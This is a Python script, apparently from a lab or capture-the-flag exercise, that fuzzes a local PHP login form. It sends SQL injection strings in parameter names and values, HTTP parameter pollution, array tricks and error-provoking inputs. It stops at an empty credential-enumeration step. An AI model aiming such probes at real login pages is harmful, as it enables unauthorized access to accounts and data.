import requests
import urllib.parse

# Target configuration
target_url = "http://127.0.0.1:32989/index.php"

print("MALFORMED PARAMETER BEHAVIOR ANALYSIS")
print("=" * 80)

# Test various parameter name variations
print("\n[1] PARAMETER NAME VARIATIONS")
print("-" * 60)

param_tests = [
    # Different parameter names
    {"usrname": "admin", "password": "admin"},
    {"user": "admin", "password": "admin"},
    {"user_name": "admin", "password": "admin"},
    {"login": "admin", "password": "admin"},
    {"name": "admin", "password": "admin"},
    {"username": "admin", "pass": "admin"},
    {"username": "admin", "pwd": "admin"},
    
    # Array notation
    {"username[]": "admin", "password": "admin"},
    {"username[0]": "admin", "password": "admin"},
    {"username[user]": "admin", "password": "admin"},
    
    # Special characters in param names
    {"username'": "admin", "password": "admin"},
    {'username"': "admin", "password": "admin"},
    {"username;": "admin", "password": "admin"},
    {"username--": "admin", "password": "admin"},
    
    # Case variations
    {"USERNAME": "admin", "PASSWORD": "admin"},
    {"Username": "admin", "Password": "admin"},
    
    # URL encoding
    {"%75%73%65%72%6E%61%6D%65": "admin", "password": "admin"},  # "username" hex
    {"user%6Eame": "admin", "password": "admin"},  # partially encoded
    
    # Overflow/edge cases
    {"username": "a" * 10000, "password": "admin"},
    {"username": "admin", "password": "b" * 10000},
]

results = []
for data in param_tests:
    r = requests.post(target_url, data=data, timeout=10)
    param_names = list(data.keys())[:2]
    desc = f"{param_names[0][:20]}/{param_names[1][:20]}"
    results.append({
        'desc': desc,
        'length': len(r.text),
        'keys': list(data.keys())
    })
    indicator = "[!]" if len(r.text) != 3178 else "   "
    print(f"  {indicator} {desc:40} Length={len(r.text)}")

# Now check what the 3108 response looks like vs 3178
print("\n\n[2] RESPONSE COMPARISON")
print("-" * 60)

# Get both types of responses
normal_resp = requests.post(target_url, data={"username": "admin", "password": "admin"}, timeout=10)
abnormal_resp = requests.post(target_url, data={"username[]": "admin", "password": "admin"}, timeout=10)

print(f"Normal parameters (username/password): {len(normal_resp.text)} bytes")
print(f"Array parameters (username[]/password): {len(abnormal_resp.text)} bytes")
print(f"Difference: {len(normal_resp.text) - len(abnormal_resp.text)} bytes")

# Get the difference section
normal_text = normal_resp.text
abnormal_text = abnormal_resp.text

print("\nContent present in normal but NOT in abnormal:")
if len(normal_text) > len(abnormal_text):
    # Check where they diverge
    min_len = min(len(normal_text), len(abnormal_text))
    for i in range(min_len):
        if normal_text[i] != abnormal_text[i]:
            print(f"  Difference at position {i}")
            print(f"  Normal:  ...{repr(normal_text[max(0,i-30):i+70])}...")
            print(f"  Abnormal: ...{repr(abnormal_text[max(0,i-30):i+70])}...")
            break
    else:
        # Normal is longer
        extra = normal_text[len(abnormal_text):]
        print(f"  Extra content: {repr(extra)}")

# 3. Check if we can inject via the parameter name itself
print("\n\n[3] PARAMETER NAME INJECTION")
print("-" * 60)

# Try SQL injection through parameter names
name_injections = [
    ("username' OR '1'='1", "admin"),
    ('username" OR "1"="1', "admin"),
    ("username'--", "admin"),
    ("username' #", "admin"),
]

for param_name, value in name_injections:
    try:
        data = {param_name: value, "password": "admin"}
        r = requests.post(target_url, data=data, timeout=10)
        print(f"  Param '{param_name[:25]:25}' Length={len(r.text)}")
    except Exception as e:
        print(f"  Param '{param_name[:25]:25}' Error: {e}")

# 4. Try HTTP Parameter Pollution
print("\n\n[4] HTTP PARAMETER POLLUTION")
print("-" * 60)

# Send same parameter multiple times
def send_hpp(params):
    # Build raw body to handle duplicate keys
    body = "&".join([f"{urllib.parse.quote(k)}={urllib.parse.quote(v)}" for k, v in params])
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = requests.post(target_url, data=body, headers=headers, timeout=10)
    return len(r.text)

hpp_tests = [
    [("username", "admin"), ("username", "admin")],
    [("username", "admin"), ("username", "' OR '1'='1")],
    [("username", "admin"), ("password", "admin"), ("password", "admin")],
    [("username", "admin"), ("username[]", "admin")],
]

for params in hpp_tests:
    l = send_hpp(params)
    desc = " + ".join([p[0] for p in params])
    print(f"  {desc:40} Length={l}")

# 5. Check if error messages appear in 3108 response
print("\n\n[5] ANALYZING 3108-BYTE RESPONSE")
print("-" * 60)

r = requests.post(target_url, data={"username[]": "admin", "password": "admin"}, timeout=10)
print(f"Response length: {len(r.text)}")
print(f"Response end: ...{r.text[-200:]}")

# Look for any error indicators
error_keywords = ['error', 'warning', 'notice', 'deprecated', 'fatal', 'parse']
found = []
for kw in error_keywords:
    if kw in r.text.lower():
        found.append(kw)
        
if found:
    print(f"\nFound keywords: {found}")
else:
    print(f"\nNo error keywords found")

# 6. Try to cause PHP errors for information disclosure
print("\n\n[6] ERROR-BASED INFORMATION DISCLOSURE")
print("-" * 60)

error_tests = [
    {"username[]": "a", "username[]": "b", "password": "x"},  # Duplicate array keys
    {"username": ["a", "b"], "password": "x"},  # Python list becomes PHP array
]

def test_error_case(data, desc):
    try:
        r = requests.post(target_url, data=data, timeout=10)
        print(f"  {desc:40} Length={len(r.text)}")
        # Check if response contains any new information
        if 'error' in r.text.lower() or 'warning' in r.text.lower():
            print(f"    [!] ERROR DETECTED!")
            print(f"    {r.text[:500]}")
    except Exception as e:
        print(f"  {desc:40} Exception: {e}")

# Simple array test
r = requests.post(target_url, data={"username[]": "x", "username[]": "y", "password": "z"}, timeout=10)
print(f"  Duplicate username[]: Length={len(r.text)}")

# 7. Try to find working credentials by exploiting the difference
print("\n\n[7] CREDENTIAL ENUMERATION ATTEMPT")
print("-" * 60)

# The fact that the app checks parameters might mean we can bypass something
